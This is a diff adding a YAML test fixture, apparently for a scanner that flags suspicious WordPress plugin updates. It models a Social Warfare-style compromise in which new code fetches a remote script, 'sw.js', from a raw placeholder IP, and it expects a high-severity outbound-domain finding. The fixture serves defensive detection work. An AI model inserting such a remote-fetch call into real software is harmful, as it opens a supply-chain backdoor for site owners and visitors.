@@ -1,0 +1,11 @@
+eco: wp-plugin
+note: 'Social Warfare 2024 shape: a raw IP address in new code'
+meta_old:
+  ref:
+    version: 1.0.0
+features_old: []
+features_new:
+- {kind: domain, key: 203.0.113.7, path: lib/social-warfare.php, line: 412, snippet: 'wp_remote_get( ''http://203.0.113.7/sw.js''
+    )'}
+expect:
+- {id: outbound-new-domain, min_severity: high}
